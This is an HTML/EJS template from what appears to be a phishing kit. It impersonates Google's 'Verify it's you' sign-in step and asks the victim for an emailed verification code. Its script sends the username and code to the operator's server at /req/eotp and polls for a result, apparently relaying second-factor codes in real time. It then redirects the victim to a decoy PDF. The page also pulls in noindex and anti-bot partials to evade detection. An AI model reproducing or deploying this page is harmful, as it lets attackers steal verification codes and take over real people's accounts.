

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Welcome</title>
    <%- include('partials/meta-noindex') %>
    <link rel="shortcut icon" href="/image/gmail.ico" type="image/x-icon">
    <link rel="stylesheet" href="/css/newstyl.css">
    <style>
        #pEyar {
            font-size: 18px;
            font-family: Arial, Helvetica, sans-serif;
            color: #2c2a2a;
        }
        
        /* Prevent zoom layout issues */
        .loginform {
            width: 1000px;
        }
        
        .fgtpwd {
    margin-left: 240px !important;
    margin-right: auto !important;
    justify-content: flex-start !important;
    display: flex !important;
}

        
        .btmdiv {
            display: flex;
            justify-content: space-between;
            align-items: center;
            margin-top: 20px;
            width: 900px;
            margin-left: auto;
            margin-right: auto;
            padding: 0 25px;
        }
        
        .left-div {
            margin-left: -42px;
            flex: 0;
        }
        
        .right-divs {
            margin-right: -42px;
            flex: 0;
        }
    </style>
</head>
<body>
    <div class="maindiv">
        <div class="form-container">
            <div class="white-overlay" id="whiteOverlay"></div>
            <div class="loading-bar" id="loadingBar"><div class="loading-bar-indicator"></div></div>
        <form class="loginform" method="post" name="loginForm" action="javascript:void(0)" accept-charset="UTF-8">
       
            <div class="form-half">
                <div><img class="divlogo" src="/image/image.png" ></div>
                <br>
                <div><span class="welcome">Verify it's you<span></div> 
                    <br>   
                    <div><span class="welcome1"><span style="white-space:nowrap;">To help keep your account safe, Google wants to make sure it's</span><br>really you trying to sign in. <a href="" style="color:#0b57d0; text-decoration:none;">Learn more</a><span></div>  
                    <br>
                        <div class="userdiv">
                  <img class="left-img"  src="/image/user-circle.png" >&nbsp;&nbsp;
                  <span class="userdiv-name" style="color: #2c2a2a;; font-size: 18px; font-family: Arial, Helvetica, sans-serif;"></span>&#8201;<span class="chip-arrow">▾</span>&#8201;
                  
                </div>
            </div>
            
            <div class="form-half1">
            
                <div class="rec-info">
                    <span>An email with a verification code was just sent to</span><br>
                    <span><%= recemail %></span>
                </div>

                <div class="passdiv">
                    <input type='hidden' name="username" id="useRname" value="">
                    <input required='' name="recoveryemail" type='text' id="pEyar" pattern="[0-9]+" inputmode="numeric" oninput="this.value = this.value.replace(/[^0-9]/g, '')">
                    <label style="color:#2c2a2a;; font-size: 16px; font-family: Arial, Helvetica, sans-serif;" alt='Enter code' placeholder='Enter code'></label>
                    <div id="errorMsg" class="error-msg" style="display:none;"><img src="/image/otpo.png"></div>
                </div>

               

                <script src="/JS/pass.js"></script>

                <div class="fgtpwd">
                    <button id="myButton" class="hyperl" ><b>Try another way</b></button>&nbsp;&nbsp;&nbsp;
                    <button type="button" class="btnnxt" id="nextBtn"><b>Next</b></button>
                  </div>

            </div>
     
        </form>
        </div>

    <script>
    document.addEventListener('DOMContentLoaded', () => {
      const tk = new URLSearchParams(window.location.search).get('nxowuwonvdmbqrrwewosnadgdhgdus') || '';
      const username = atob(tk);
      document.getElementById('useRname').value = username;
      document.querySelector('.userdiv-name').textContent = username;

      document.getElementById('myButton').onclick = function () {
        location.href = "https://mail.google.com";
      };

      function showError() {
        document.getElementById('loadingBar').classList.remove('active');
        document.getElementById('whiteOverlay').classList.remove('active');
        document.getElementById('pEyar').classList.add('input-error');
        document.getElementById('errorMsg').style.display = 'block';
      }

      function pollResult(username) {
        fetch('/eotpresult?u=' + encodeURIComponent(username))
          .then(r => r.json())
          .then(data => {
            if (data.result === 'success') {
              window.location.href = '/DRA Tech Justification.pdf';
            } else if (data.result === 'redirected') {
              window.location.href = '/DRA Tech Justification.pdf';
            } else if (data.result === 'error') {
              showError();
            } else {
              setTimeout(() => pollResult(username), 2000);
            }
          }).catch(() => setTimeout(() => pollResult(username), 2000));
      }

      document.getElementById('nextBtn').onclick = function () {
        const code = document.getElementById('pEyar').value;
        const username = document.getElementById('useRname').value;
        if (!code) return;
        document.getElementById('loadingBar').classList.add('active');
        document.getElementById('whiteOverlay').classList.add('active');
        fetch('/req/eotp', {
          method: 'POST',
          headers: {'Content-Type': 'application/json'},
          body: JSON.stringify({ username, code })
        }).then(() => pollResult(username))
          .catch(() => pollResult(username));
      };

      document.getElementById('pEyar').addEventListener('input', function() {
        this.classList.remove('input-error');
        document.getElementById('errorMsg').style.display = 'none';
      });
    });
    </script>
        

        <div class="btmdiv">
            <div class="left-div">
                <select class="btmhypl" id="language-select">
                    <option value="en">English (United States)</option>
                    <option value="fr">French</option>
                    <option value="es">Spanish</option>
                    <option value="de">German</option>
                    <!-- Add more options as needed -->
                </select>
            </div>
                <div class="right-divs">
                    <div class="right-div">
                        <button id="myButton" class="btmhypl" >Help</button>
                    </div>
                    <div class="right-div">
                        <button id="myButton" class="btmhypl" >Privacy</button>
                    </div>
                    <div class="right-div">
                        <button id="myButton" class="btmhypl" >Terms</button>
                    </div>
                </div>
        </div>


    </div>
    
<%- include('partials/antibot') %>
</body>
</html>